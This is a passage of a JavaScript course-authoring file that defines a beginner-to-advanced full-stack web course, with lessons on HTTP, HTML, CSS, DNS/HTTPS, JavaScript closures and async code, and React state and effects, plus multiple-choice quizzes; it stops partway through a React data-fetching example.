import { course, chapter, lesson, q } from '../authoring.js';

export default course({
  slug: 'full-stack-web',
  title: 'Full-Stack Web Development',
  category: 'Web',
  level: 'Beginner → Advanced',
  duration: '8 weeks',
  accent: 'violet',
  coverKey: 'full-stack-web',
  summary:
    'Go from raw HTML to a deployed application with a React front end, an Express API, and a real database behind it.',
  description:
    'The full path a request takes, built one layer at a time. You write the markup, the styles, the interactive UI, the API that serves it, and the data layer underneath — then ship the result.',
  chapters: [
    chapter(
      'How the Web Works',
      'The request/response cycle, and the markup and styling every page is built from.',
      [
        lesson('The Request/Response Cycle', 12, `
Every web page you have ever loaded is the result of the same short conversation. Your browser sends a **request**; a server sends back a **response**. Everything else in this course is detail layered on top of that exchange.

### What the browser sends

When you type an address and hit enter, the browser builds a request that looks roughly like this:

\`\`\`http
GET /courses HTTP/1.1
Host: example.com
Accept: text/html
\`\`\`

Three things matter here:

- **The method** — \`GET\` means "give me something". \`POST\` means "here is some data, do something with it". \`PUT\`/\`PATCH\` update, \`DELETE\` removes.
- **The path** — \`/courses\` identifies *which* resource you want.
- **The headers** — metadata about the request. \`Accept\` tells the server what format you can handle.

### What the server sends back

\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html

<!doctype html><html>...
\`\`\`

The **status code** is the server's one-word summary of what happened:

| Range | Meaning | Common examples |
|---|---|---|
| 2xx | It worked | \`200 OK\`, \`201 Created\` |
| 3xx | Look elsewhere | \`301 Moved\`, \`304 Not Modified\` |
| 4xx | You made a mistake | \`400 Bad Request\`, \`401 Unauthorized\`, \`404 Not Found\` |
| 5xx | The server made a mistake | \`500 Internal Server Error\` |

That 4xx/5xx split matters more than it looks. A 4xx is the client's fault — bad input, missing credentials. A 5xx is *yours*. When you build an API later in this course, returning the right one is how callers know whether to fix their request or retry.

### Why "stateless" matters

HTTP has no memory. The server does not know that the request it just handled came from the same person as the previous one. Every request arrives as a blank slate.

This is why logins need **tokens or cookies** — a piece of identification the browser attaches to every single request. We build exactly that in Chapter 5.

### Try it yourself

Open your browser's DevTools, go to the Network tab, and reload any page. Every row is one request/response pair. Click one and you will see the method, path, status, and headers we just walked through — the same conversation, made visible.
        `,
        [
          q('Which HTTP method means "here is some data, do something with it"?', [
            'GET',
            'POST',
            'HEAD',
            'OPTIONS',
          ], 1, 'POST submits data for the server to act on; GET only asks for a resource.'),
          q('A response returns 503. Whose problem is it?', [
            'The client sent bad input',
            'The server failed',
            'The resource moved',
            'Authentication is missing',
          ], 1, "5xx is a server-side failure; 4xx would mean the client's request was at fault."),
          q('What does it mean that HTTP is stateless?', [
            'Responses cannot be cached',
            'Each request arrives with no memory of previous ones',
            'Only one request may be open at a time',
            'The server cannot store data',
          ], 1, 'Nothing about the previous request is carried over, which is why identity must be re-sent every time.'),
        ]),
        lesson('HTML That Means Something', 12, `
HTML describes **what content is**, not what it looks like. Getting that distinction right is the difference between a page that works for everyone and one that only works for people exactly like you.

### Structure over appearance

Compare these two:

\`\`\`html
<!-- Div soup: says nothing -->
<div class="top">
  <div class="big-text">Our Courses</div>
</div>

<!-- Semantic: says what it is -->
<header>
  <h1>Our Courses</h1>
</header>
\`\`\`

Both can be styled to look identical. Only the second tells a screen reader "this is the page heading", lets a search engine understand the page, and gives keyboard users something to navigate by.

### The elements worth knowing

- \`<header>\`, \`<nav>\`, \`<main>\`, \`<footer>\` — page landmarks. Exactly one \`<main>\` per page.
- \`<article>\` — self-contained content that would make sense on its own (a course card, a blog post).
- \`<section>\` — a thematic grouping, almost always with a heading.
- \`<h1>\`–\`<h6>\` — an outline. Never skip levels to get a smaller font; that is what CSS is for.
- \`<button>\` vs \`<a>\` — a button *does* something, a link *goes* somewhere. This is the single most common mistake in real codebases.

### Forms are the workhorse

\`\`\`html
<form>
  <label for="email">Email address</label>
  <input id="email" name="email" type="email" required />
  <button type="submit">Sign up</button>
</form>
\`\`\`

Every input needs a \`<label>\` connected by \`for\`/\`id\`. This is not optional politeness — without it, a screen reader announces an unlabelled box, and clicking the text will not focus the field.

The \`type\` attribute earns its keep: \`type="email"\` gives mobile users an @ key and free format validation, \`type="number"\` gives a numeric keypad, \`type="password"\` masks input.

### The accessibility test that takes 10 seconds

Put your mouse away and press Tab repeatedly. Can you reach every interactive element? Can you see where you are? If not, neither can a substantial number of your users — and in many jurisdictions, that is a legal problem as well as a design one.
        `,
        [
          q('You need an element that performs an action rather than navigating. Which?', [
            '<a>',
            '<button>',
            '<div onclick>',
            '<span role="link">',
          ], 1, 'Buttons act, links navigate; using the right one gives keyboard and screen-reader behaviour for free.'),
          q('Why must every input have an associated <label>?', [
            'It centres the field',
            'Screen readers announce an unlabelled box, and the text will not focus the field',
            'It is required for validation',
            'It sets the input type',
          ], 1, 'The for/id association is what makes the control announceable and the label clickable.'),
          q('What does type="email" give you beyond styling?', [
            'Server-side validation',
            'An @ key on mobile and free format checking',
            'Automatic encryption',
            'A required field',
          ], 1, 'The type drives the on-screen keyboard and basic browser validation.'),
        ]),
        lesson('CSS Layout Without the Guesswork', 14, `
Most CSS frustration comes from fighting the layout system instead of using it. Modern CSS has two layout engines that handle almost everything: **Flexbox** for one dimension, **Grid** for two.

### The box model

Every element is a box: content, then \`padding\`, then \`border\`, then \`margin\`. By default, setting \`width: 300px\` sizes only the *content*, so padding and border make the visible box wider than you asked for.

Fix it once, globally:

\`\`\`css
*, *::before, *::after { box-sizing: border-box; }
\`\`\`

Now \`width: 300px\` means the box is 300px, padding included. Put this in every project.

### Flexbox: one direction

\`\`\`css
.toolbar {
  display: flex;
  gap: 1rem;              /* space between children — never use margins for this */
  align-items: center;    /* cross axis */
  justify-content: space-between; /* main axis */
}
\`\`\`

Reach for Flexbox when items flow in a line: nav bars, button rows, a label beside a value.

### Grid: two directions

\`\`\`css
.cards {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
  gap: 2rem;
}
\`\`\`

That one rule is a fully responsive card grid with no media queries. It reads as: "as many columns as fit, each at least 260px, sharing leftover space equally". Cards reflow from three across to two to one as the screen narrows.

### Mobile first

Write the narrow layout as your base, then add complexity upward:

\`\`\`css
.layout { display: block; }

@media (min-width: 768px) {
  .layout { display: grid; grid-template-columns: 250px 1fr; }
}
\`\`\`

Starting narrow keeps the base case simple. Starting wide means every media query is an undo.

### Units that scale

Use \`rem\` for type and spacing so everything respects the user's browser font size. Use \`%\` and \`fr\` for widths. Reserve \`px\` for things that genuinely should not scale, like a 1px border.
        `,
        [
          q('What does box-sizing: border-box change?', [
            'Margins collapse',
            'width includes padding and border rather than only content',
            'Borders are removed',
            'Elements become flex containers',
          ], 1, 'Without it, padding and border are added on top of the width you set.'),
          q('Which layout tool suits a row of buttons?', [
            'Grid',
            'Flexbox',
            'Float',
            'Absolute positioning',
          ], 1, 'Flexbox handles one dimension, which is what a button row is.'),
          q('Why write the narrow layout first and add media queries upward?', [
            'Mobile browsers ignore media queries',
            'The base case stays simple; starting wide makes every query an undo',
            'It reduces file size',
            'Desktop styles cannot be overridden',
          ], 1, 'Mobile-first keeps each query additive rather than corrective.'),
        ]),
        lesson('URLs, DNS, and HTTPS', 12, `
Before a single byte of that request leaves your machine, the browser has to work out **where to send it**. That resolution step is invisible when it works, and it is where a surprising share of "the site is down" reports actually live.

### Every URL is six parts

\`\`\`
https://learn.example.com:443/courses/full-stack-web?tab=outline#chapter-3
\`\`\`

| Part | In the example | Who reads it |
|---|---|---|
| scheme | \`https\` | The browser — picks the protocol and the default port |
| host | \`learn.example.com\` | DNS, which turns the name into an IP address |
| port | \`443\` | The server. 443 for https, 80 for http, so it is normally implied |
| path | \`/courses/full-stack-web\` | Your Express router (Chapter 4) |
| query | \`tab=outline\` | Your handler, as \`req.query\` |
| fragment | \`chapter-3\` | The browser alone — **never sent to the server** |

That last row catches people out. A fragment appears in no server log, because it never leaves the browser. It is why an API can never read one, and why the old \`#/courses\` style of client-side routing needed no server configuration at all.

### Encode anything you did not type yourself

\`\`\`js
const term = 'react & node';
const url = \`/api/search?q=\${encodeURIComponent(term)}\`;
// /api/search?q=react%20%26%20node
\`\`\`

Without \`encodeURIComponent\`, that \`&\` starts a new query parameter and the search silently becomes \`react \`. Encode every value you interpolate into a URL — it is the same discipline as parameterised SQL in Chapter 5, for the same reason: data must never be mistaken for syntax.

And never put a token or a password in a query string. Query strings are written to access logs, kept in browser history, and leaked to third parties in the \`Referer\` header. Secrets belong in a header or a request body.

### DNS turns a name into an address

A hostname is not an address. Resolving one walks a chain of caches: the browser, the operating system, your ISP or company resolver, then the authoritative nameserver for the domain.

| Record | Means |
|---|---|
| \`A\` | This name points at this IPv4 address |
| \`AAAA\` | The same, for IPv6 |
| \`CNAME\` | This name is an alias for another name |
| \`TXT\` | Free text, usually domain verification |

Every record carries a **TTL** — how many seconds a resolver may keep the answer before asking again. That one number explains the most common launch-day surprise: you repoint the domain at a new host, it works from your laptop, and a colleague still sees the old site an hour later. Nothing is broken; their resolver is still inside the TTL. Drop the TTL to 300 seconds a day *before* a planned migration, then raise it once traffic has moved.

\`\`\`bash
dig +short learn.example.com          # what the world currently resolves it to
curl -sI https://learn.example.com    # status line and headers, no body
\`\`\`

### What the s in https buys you

Before any HTTP is exchanged, the server presents a certificate signed by an authority your browser trusts, both sides agree on keys, and everything after that — path, headers, cookies, body — is encrypted in transit. What it does *not* hide is which site you visited: the DNS lookup and the handshake both reveal the hostname.

Two consequences you will meet in practice:

- **Mixed content.** An HTTPS page that pulls a script over plain \`http://\` has it blocked outright. One hard-coded \`http://\` asset URL is enough to break a page that worked perfectly in development.
- **Certificates expire.** One that lapses at 03:00 takes the entire site down behind a full-screen browser warning, with no code change to blame. Automate renewal and alert on days remaining rather than trusting a calendar reminder.

Redirect HTTP to HTTPS rather than serving both, so a link somebody pasted two years ago still lands on the encrypted version.
        `,
        [
          q('Which part of a URL is never sent to the server?', [
            'The path',
            'The query string',
            'The fragment after the hash',
            'The port',
          ], 2, 'The fragment is handled entirely inside the browser, so it appears in no request and no server log.'),
          q('You repoint your domain at a new host. It works for you; a colleague still sees the old site. Why?', [
            'Their browser cached the HTML',
            'Their resolver is still inside the record TTL and has not asked again',
            'The new host has not finished issuing a certificate',
            'CNAME records only apply to www subdomains',
          ], 1, 'A TTL tells resolvers how long they may reuse an answer, so old addresses linger until it expires.'),
          q('Why should an API token never travel in a query string?', [
            'Query strings land in access logs, browser history, and Referer headers',
            'Query strings are limited to 255 characters',
            'Browsers strip query strings from HTTPS requests',
            'Express cannot read query strings on POST requests',
          ], 0, 'Everything in the URL is recorded in places you do not control, whereas a header or body is not routinely logged.'),
        ]),
      ],
      [
        q('Which status code range means the client sent something wrong?', ['2xx', '3xx', '4xx', '5xx'], 2,
          '4xx is a client error — bad input, missing auth. 5xx means the server failed.'),
        q('Why do logins need cookies or tokens?', [
          'Because HTTP is stateless and the server cannot remember previous requests',
          'Because passwords are too long for a URL',
          'Because browsers block repeat requests',
          'Because HTML forms cannot send data',
        ], 0, 'Each HTTP request arrives with no memory of the last, so identity must be re-sent every time.'),
        q('You need an element that navigates to another page. Which is correct?', [
          '<button>', '<a>', '<div onclick>', '<span role="link">',
        ], 1, 'Links navigate, buttons act. Using the right one gives you keyboard and screen-reader behaviour for free.'),
        q('What does grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)) produce?', [
          'Exactly three equal columns',
          'A single scrolling row',
          'As many columns as fit, each at least 260px wide',
          'One column per child element',
        ], 2, 'auto-fill packs in as many tracks as fit; minmax sets the floor and lets them share the remainder.'),
      ]
    ),
    chapter(
      'JavaScript for Applications',
      'The language features you actually reach for when building real software.',
      [
        lesson('Values, Scope, and Functions', 13, `
JavaScript has a reputation for surprising people. Almost all of those surprises come from three areas: how values are copied, how scope works, and how \`this\` is bound.

### Primitives copy, objects share

\`\`\`js
let a = 5;
let b = a;
b = 10;
console.log(a); // 5 — numbers are copied

const x = { count: 5 };
const y = x;
y.count = 10;
console.log(x.count); // 10 — objects share a reference
\`\`\`

\`x\` and \`y\` are two names for **the same object**. This single fact explains most "why did my data change?" bugs, and it is why React insists you create new objects rather than mutating existing ones (Chapter 3).

### const, let — and never var

\`\`\`js
const total = 0;   // cannot be reassigned
let count = 0;     // can be reassigned
\`\`\`

Default to \`const\`. Reach for \`let\` only when you genuinely reassign. \`var\` leaks out of blocks and hoists confusingly — it exists only for backwards compatibility.

Note that \`const\` prevents *reassignment*, not *mutation*:

\`\`\`js
const list = [1, 2];
list.push(3);   // fine — the binding still points at the same array
list = [4];     // TypeError
\`\`\`

### Functions and arrow functions

\`\`\`js
function double(n) { return n * 2; }
const double = (n) => n * 2;   // implicit return
const greet = (name) => { return \`Hi \${name}\`; };
\`\`\`

The real difference is \`this\`. Arrow functions do not create their own \`this\` — they inherit it from where they were defined. That is why callbacks are almost always arrows:

\`\`\`js
class Timer {
  constructor() { this.seconds = 0; }
  start() {
    setInterval(() => { this.seconds++; }, 1000); // arrow keeps \`this\`
  }
}
\`\`\`

With a regular \`function\` there, \`this\` would be undefined and the counter would throw.

### Truthiness

Falsy values, in full: \`false\`, \`0\`, \`-0\`, \`0n\`, \`""\`, \`null\`, \`undefined\`, \`NaN\`. Everything else is truthy — including \`[]\` and \`{}\`.

This bites when checking for missing values:

\`\`\`js
if (count) { }          // skips when count is 0 — probably a bug
if (count != null) { }  // only skips null and undefined — usually what you meant
\`\`\`

Use \`??\` for defaults rather than \`||\` when zero and empty string are valid:

\`\`\`js
const perPage = input ?? 20;  // 0 stays 0
const perPage = input || 20;  // 0 becomes 20 — often wrong
\`\`\`
        `,
        [
          q('const x = { count: 5 }; const y = x; y.count = 10; — what is x.count now?', [
            '5, because const freezes the object',
            '10, because both names point at the same object',
            'undefined, because y shadowed x',
            'A TypeError is thrown',
          ], 1, 'Objects are assigned by reference, so x and y are two names for one object in memory.'),
          q('Why is the callback inside setInterval written as an arrow function in the Timer example?', [
            'Arrow functions run faster inside timers',
            'Regular functions cannot be passed to setInterval',
            'Arrows inherit `this` from where they were defined, so this.seconds still resolves',
            'Arrows are hoisted, so the interval can start earlier',
          ], 2, 'An arrow has no `this` of its own; a regular function would rebind it and this.seconds would throw.'),
          q('Which of these is falsy?', [
            'An empty array',
            'An empty object',
            'The string "0"',
            'An empty string',
          ], 3, 'The empty string is on the falsy list; [] and {} are objects and "0" is a non-empty string, so all three are truthy.'),
        ]),
        lesson('Arrays, Objects, and Immutable Updates', 13, `
Most application code is transforming lists and records. Learning the handful of methods that do this without mutation will carry you through the rest of the course.

### The four you will use constantly

\`\`\`js
const courses = [
  { title: 'React', hours: 20, level: 'beginner' },
  { title: 'Node',  hours: 30, level: 'advanced' },
  { title: 'CSS',   hours: 10, level: 'beginner' },
];

// map — transform each item, same length out
courses.map(c => c.title);            // ['React', 'Node', 'CSS']

// filter — keep matching items
courses.filter(c => c.level === 'beginner');   // React and CSS

// find — first match, or undefined
courses.find(c => c.title === 'Node');

// reduce — collapse to a single value
courses.reduce((sum, c) => sum + c.hours, 0);  // 60
\`\`\`

All four return something new and leave the original array untouched. Chain them freely:

\`\`\`js
const beginnerHours = courses
  .filter(c => c.level === 'beginner')
  .reduce((sum, c) => sum + c.hours, 0);   // 30
\`\`\`

### Mutating vs non-mutating

This distinction matters enormously in React:

| Mutates (avoid in state) | Returns new (prefer) |
|---|---|
| \`push\`, \`pop\`, \`splice\` | \`[...arr, item]\`, \`slice\` |
| \`sort\`, \`reverse\` | \`[...arr].sort()\` |
| \`obj.key = value\` | \`{ ...obj, key: value }\` |

\`sort\` catches everyone out — it sorts **in place** and returns the same array. Copy first.

### Spreading and destructuring

\`\`\`js
// Copy an object with one field changed
const updated = { ...course, hours: 25 };

// Add to an array without mutating
const withNew = [...courses, { title: 'SQL', hours: 15 }];

// Pull fields out by name
const { title, hours } = course;
const { level = 'beginner' } = course;   // with a default

// Same for arrays, by position
const [first, second] = courses;
\`\`\`

### Optional chaining

When data might be missing — and data from an API always might be:

\`\`\`js
const city = user?.address?.city;        // undefined instead of a crash
const count = user?.courses?.length ?? 0;
\`\`\`

Without \`?.\`, a missing \`address\` throws \`Cannot read properties of undefined\`. This one operator eliminates a whole category of production errors.
        `,
        [
          q('You need the courses sorted by hours without changing the original array. Which is correct?', [
            'courses.sort((a, b) => a.hours - b.hours)',
            '[...courses].sort((a, b) => a.hours - b.hours)',
            'courses.reverse().sort()',
            'courses.map(c => c).sort() applied in place',
          ], 1, 'sort mutates and returns the same array, so you must copy with a spread before sorting.'),
          q('user exists but has no courses property. What does user?.courses?.length ?? 0 give you?', [
            'A TypeError on the missing property',
            'null',
            '0',
            'undefined',
          ], 2, 'Optional chaining short-circuits to undefined, and ?? then substitutes the 0 default.'),
          q('When does the default in const { level = "beginner" } = course apply?', [
            'Always, overriding whatever course.level holds',
            'Whenever course.level is falsy, including 0',
            'Never — destructuring ignores defaults',
            'Only when course.level is undefined',
          ], 3, 'Destructuring defaults fill in for undefined alone, not for every falsy value.'),
        ]),
        lesson('Async JavaScript: Promises and async/await', 15, `
JavaScript runs your code on a single thread. If it waited for a network request to finish, the entire page would freeze. Instead, slow work is handed off and your code carries on — which is why async code exists.

### A promise is a value that has not arrived yet

A promise is in one of three states: **pending**, **fulfilled** (it has a value), or **rejected** (it has an error).

\`\`\`js
fetch('/api/courses')
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));
\`\`\`

### async/await reads better

The same thing, written to look sequential:

\`\`\`js
async function loadCourses() {
  try {
    const res = await fetch('/api/courses');
    if (!res.ok) throw new Error(\`Request failed: \${res.status}\`);
    const data = await res.json();
    return data;
  } catch (err) {
    console.error('Could not load courses', err);
    return [];
  }
}
\`\`\`

Two things to remember:

1. \`await\` only works inside an \`async\` function.
2. An \`async\` function **always** returns a promise, even when you return a plain value.

### fetch does not reject on 404

This surprises nearly everyone. \`fetch\` only rejects on *network* failure — a 404 or 500 is a perfectly successful round trip as far as it is concerned. You must check \`res.ok\` yourself, as above. Forgetting this means error pages get parsed as if they were data.

### Run independent work in parallel

\`\`\`js
// Sequential — 2 seconds total. Wasteful when they do not depend on each other.
const user = await fetchUser();
const courses = await fetchCourses();

// Parallel — 1 second total.
const [user, courses] = await Promise.all([fetchUser(), fetchCourses()]);
\`\`\`

Use \`Promise.all\` whenever requests do not depend on one another. Note it rejects as soon as *any* input rejects; \`Promise.allSettled\` waits for all and reports each outcome separately.

### Loops and await

\`\`\`js
// Sequential — each waits for the last
for (const id of ids) {
  await save(id);
}

// Parallel — all at once
await Promise.all(ids.map(id => save(id)));
\`\`\`

Both are correct; pick deliberately. Sequential when order matters or you are respecting a rate limit, parallel when you just want it done.
        `,
        [
          q('An async function ends with return 5. What does the caller receive?', [
            'The number 5',
            'A promise that resolves to 5',
            'undefined, because async functions cannot return',
            'A pending promise that never settles',
          ], 1, 'An async function always wraps its return value in a promise, even for a plain number.'),
          q('Four independent requests run together and one rejects. You still need the other three results. Which helper?', [
            'Promise.all',
            'Promise.race',
            'Promise.allSettled',
            'Promise.any',
          ], 2, 'Promise.all rejects the moment any input rejects; allSettled waits for all and reports each outcome.'),
          q('What does for (const id of ids) { await save(id); } do?', [
            'Saves one at a time, each waiting for the previous to finish',
            'Starts every save immediately and waits for the slowest',
            'Throws, because await is not allowed in a for loop',
            'Saves only the first id',
          ], 0, 'Each await pauses the loop, which is what you want for ordering or rate limits and not what you want for speed.'),
        ]),
        lesson('Closures and the Functions They Capture', 13, `
A closure is a function that remembers the variables it was created beside, even after the code that created it has finished. That single sentence explains private state, debouncing, and a whole family of bugs that look like React losing your data.

### The variable outlives the call

\`\`\`js
function makeCounter() {
  let count = 0;                 // local to this one call
  return {
    increment: () => ++count,
    value: () => count,
  };
}

const a = makeCounter();
const b = makeCounter();
a.increment();
a.increment();
console.log(a.value(), b.value());   // 2 0
\`\`\`

\`makeCounter\` returned long ago, but its \`count\` is still alive because the two arrows reference it. Every call creates a **fresh** \`count\`, which is why \`b\` is untouched, and nothing outside can read or corrupt it. That is genuine private state, with no class and no convention about leading underscores.

### The pattern you will actually write

\`\`\`js
function debounce(fn, ms) {
  let timer;                     // captured once, shared by every later call
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), ms);
  };
}

const search = debounce((term) => {
  fetch(\`/api/search?q=\${encodeURIComponent(term)}\`);
}, 300);

input.addEventListener('input', (e) => search(e.target.value));
\`\`\`

Twelve keystrokes now produce one request instead of twelve. The whole thing works because \`timer\` lives between calls without being global.

The classic mistake is calling \`debounce(fn, 300)\` *inside* the event handler. That builds a brand new closure — and a brand new \`timer\` — on every keystroke, so nothing is ever cancelled and you get your twelve requests back. Create the debounced function once, then call it many times.

### Each let iteration gets its own binding; var does not

\`\`\`js
for (var i = 0; i < 3; i++) setTimeout(() => console.log(i), 0);   // 3 3 3
for (let i = 0; i < 3; i++) setTimeout(() => console.log(i), 0);   // 0 1 2
\`\`\`

\`var\` creates one binding for the entire loop, and all three callbacks close over that same binding — which is \`3\` by the time the timers fire. \`let\` creates a new binding per iteration, so each callback captures its own. This is the clearest practical reason the previous lesson said never to use \`var\`.

### Stale closures: the bug that looks like broken state

\`\`\`js
useEffect(() => {
  const id = setInterval(() => setCount(count + 1), 1000);
  return () => clearInterval(id);
}, []);   // runs once — so this callback captured count when it was 0
\`\`\`

The counter goes 0, then 1, then stays at 1 forever. The interval callback closed over \`count\` as it stood on the first render, and because the effect never re-ran, it never saw a newer one. \`count + 1\` is \`0 + 1\` on every tick.

Two fixes, both worth knowing:

\`\`\`js
setCount(c => c + 1);        // ask for the latest value instead of capturing one
\`\`\`

or list \`count\` in the dependency array so the effect — and its closure — is rebuilt each time. The functional form is almost always the better answer, because it keeps the interval running instead of tearing it down every second.

### Closures pin memory

A captured variable cannot be garbage collected while the function that captured it is still reachable. An event listener that closes over a 10,000-row array keeps that array in memory for as long as the listener stays registered. Removing listeners and clearing timers is not tidiness; it is how the memory gets released.
        `,
        [
          q('const a = makeCounter(); const b = makeCounter(); a.increment(); — what does b.value() return?', [
            '1, because count is shared between the two counters',
            '0, because each call to makeCounter creates its own count',
            'undefined, because count went out of scope when makeCounter returned',
            'It throws, because count was garbage collected',
          ], 1, 'Each invocation creates a fresh local variable, and the closures returned by that call capture only it.'),
          q('for (var i = 0; i < 3; i++) setTimeout(() => console.log(i), 0); — what is logged?', [
            '3 3 3',
            '0 1 2',
            '0 0 0',
            'Nothing — the callbacks never run',
          ], 0, 'var has a single binding for the whole loop, and all three callbacks read it after the loop has finished.'),
          q('An interval created in a mount-only effect calls setCount(count + 1) and the counter sticks at 1. Why?', [
            'setInterval only fires once per component',
            'State updates are batched, so the extra ticks are discarded',
            'The callback captured count from the first render and never sees a newer value',
            'The cleanup function runs after every tick',
          ], 2, 'The effect never re-ran, so its closure still holds the original count; setCount(c => c + 1) asks for the current one instead.'),
        ]),
      ],
      [
        q('const list = [1,2]; list.push(3); — what happens?', [
          'TypeError, because list is const',
          'It works; const prevents reassignment, not mutation',
          'The array is silently copied',
          'It works but returns a new array',
        ], 1, 'const locks the binding, not the contents. list = [4] would throw; list.push(3) is fine.'),
        q('Which expression leaves 0 as 0 rather than replacing it with the default?', [
          'input || 20', 'input ?? 20', 'input && 20', 'Boolean(input) ? input : 20',
        ], 1, '?? only falls back on null/undefined. || falls back on every falsy value, including 0 and "".'),
        q('Why must you check res.ok after fetch?', [
          'Because fetch does not reject on 4xx/5xx responses',
          'Because res.json() is synchronous',
          'Because fetch always returns undefined on error',
          'Because .catch() cannot be used with fetch',
        ], 0, 'fetch rejects only on network failure. A 404 resolves normally, so an unchecked response gets parsed as data.'),
        q('Two independent API calls each take 1 second. Fastest correct approach?', [
          'await one, then await the other',
          'Promise.all([a(), b()])',
          'A for loop with await inside',
          'Call them without await',
        ], 1, 'Promise.all starts both immediately and waits for both — about 1 second instead of 2.'),
      ]
    ),
    chapter(
      'Building UIs with React',
      'Components, state, and effects — the mental model behind every React app.',
      [
        lesson('Components and Props', 12, `
A React component is a function that takes data and returns a description of UI. That is the whole idea; everything else is a refinement of it.

\`\`\`jsx
function CourseCard({ title, duration, level }) {
  return (
    <article className="card">
      <h3>{title}</h3>
      <p>{duration} · {level}</p>
    </article>
  );
}
\`\`\`

Used like an HTML tag, with data passed as attributes:

\`\`\`jsx
<CourseCard title="React Basics" duration="4 weeks" level="Beginner" />
\`\`\`

### JSX is JavaScript

Curly braces drop you back into JavaScript. Anything that evaluates to a value works:

\`\`\`jsx
<p>{course.title.toUpperCase()}</p>
<p>{isFree ? 'Free' : \`$\${price}\`}</p>
{error && <p className="error">{error}</p>}
\`\`\`

Because JSX compiles to function calls, a few HTML attribute names change: \`class\` becomes \`className\`, \`for\` becomes \`htmlFor\`, and event handlers are camelCase (\`onClick\`, not \`onclick\`).

### Rendering lists

\`\`\`jsx
<div className="grid">
  {courses.map(course => (
    <CourseCard key={course.id} {...course} />
  ))}
</div>
\`\`\`

The \`key\` must be **stable and unique** — a database id, not the array index. With index keys, inserting an item at the front makes React think every item changed, which loses input state and scroll position. This is one of the most common real-world React bugs.

### Props are read-only

A component must never modify its own props. Data flows **down** from parent to child; to send information back up, the parent passes a function:

\`\`\`jsx
function CourseCard({ title, onEnroll }) {
  return <button onClick={() => onEnroll(title)}>Enrol</button>;
}

// Parent decides what enrolling means
<CourseCard title="React" onEnroll={handleEnroll} />
\`\`\`

This one-way flow is what makes React apps traceable: to find out why something on screen looks the way it does, you walk *up* the tree.

### Composition with children

\`\`\`jsx
function Panel({ title, children }) {
  return (
    <section className="panel">
      <h2>{title}</h2>
      {children}
    </section>
  );
}

<Panel title="Outline"><LessonList /></Panel>
\`\`\`

\`children\` is whatever you nested inside the tag — the main tool for building reusable layout components.
        `,
        [
          q('A CourseCard needs to tell its parent that Enrol was clicked. What is the React way?', [
            'The card writes to the prop it received',
            'The card imports the parent and calls setState on it',
            'The parent passes a callback down as a prop and the card calls it',
            'The card returns a value from its render',
          ], 2, 'Data flows down and events flow up through functions passed as props, which keeps the tree traceable.'),
          q('What does the children prop contain?', [
            'Whatever was nested between the component tags',
            'Every child component in the file',
            'The component list returned by map()',
            'The DOM nodes React created for the component',
          ], 0, 'children is the JSX you nested inside the tag, which is what makes wrapper components reusable.'),
          q('Which snippet renders the error paragraph only when error is set?', [
            '{if (error) <p>{error}</p>}',
            '{error && <p className="error">{error}</p>}',
            '{error <p>{error}</p>}',
            '{error => <p>{error}</p>}',
          ], 1, 'Braces take an expression, not a statement, so conditional rendering uses && or a ternary rather than if.'),
        ]),
        lesson('State and Events', 13, `
Props come from outside. **State** is data a component owns and changes over time.

\`\`\`jsx
import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>Clicked {count}</button>;
}
\`\`\`

\`useState\` returns the current value and a setter. Calling the setter tells React to re-run the component and paint the new result.

### Never mutate state

\`\`\`jsx
// Wrong — React sees the same array reference and skips re-rendering
items.push(newItem);
setItems(items);

// Right — a new array
setItems([...items, newItem]);

// Wrong
user.name = 'Ali';
setUser(user);

// Right
setUser({ ...user, name: 'Ali' });
\`\`\`

React compares by reference. Mutating in place leaves the reference identical, so React concludes nothing changed and your UI silently goes stale. This is the direct practical consequence of "objects share a reference" from Chapter 2.

### Updates are batched and asynchronous

\`\`\`jsx
setCount(count + 1);
setCount(count + 1);   // count was captured once; this adds 1, not 2

setCount(c => c + 1);
setCount(c => c + 1);  // functional form — correctly adds 2
\`\`\`

When the next value depends on the previous one, pass a function. React hands you the latest value rather than the one captured when the handler was created.

### Controlled inputs

\`\`\`jsx
function SignupForm({ onSubmit }) {
  const [email, setEmail] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();          // stop the browser reloading the page
    onSubmit({ email });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        required
      />
      <button type="submit">Sign up</button>
    </form>
  );
}
\`\`\`

The input's value comes *from* state and changes *through* state. React is now the single source of truth, so validating, resetting, or pre-filling the form is just a state update.

### Where should state live?

Put state in the **closest common ancestor** of every component that needs it. Too high and unrelated parts of the app re-render; too low and you cannot share it. When two siblings need the same data, lift it to their parent.
        `,
        [
          q('Two sibling components need the same piece of state. Where does it belong?', [
            'Duplicated in each sibling and kept in sync',
            'In their closest common ancestor',
            'At the root of the app, always',
            'In a module-level variable outside React',
          ], 1, 'Lifting only as far as the nearest shared parent shares the data without re-rendering unrelated branches.'),
          q('What does e.preventDefault() do in the form submit handler?', [
            'Stops the browser reloading the page on submit',
            'Clears the input values',
            'Blocks the onChange handler from firing',
            'Prevents React from re-rendering',
          ], 0, 'A form submit natively navigates the page; preventDefault keeps the handler in charge instead.'),
          q('user is { name: "Sara", email: "s@x.com" }. Which correctly updates only the name?', [
            'user.name = "Ali"; setUser(user);',
            'setUser(user.name = "Ali");',
            'setUser({ name: "Ali" });',
            'setUser({ ...user, name: "Ali" });',
          ], 3, 'Spreading copies the other fields into a new object, so the reference changes and email survives.'),
        ]),
        lesson('Effects and Data Fetching', 14, `
Rendering should be pure: given the same props and state, a component returns the same UI and touches nothing else. Anything outside that — network requests, subscriptions, timers — is a **side effect**, and belongs in \`useEffect\`.

\`\`\`jsx
import { useState, useEffect } from 'react';

function CourseList() {
  const [courses, setCourses] = useState([]);
  const [status, setStatus] = useState('loading');

  useEffect(() => {
    let cancelled = false;

    (async () => {
      try {
        const res = await fetch('/api/learn/courses');
        if (!res.ok) throw new Error(res.status);
        const data = await res.json();
        if (!cancelled) { setCourses(data.data); setStatus('ready'); }
      } catch {
        if (!cancelled) setStatus('error');
      }
    })();

    return () => { cancelled = true; };   // cleanup
  }, []);

  if (status === 'loading') return <p>Loading…</p>;
  if (status === 'error') return <p>Could not load courses.</p>;
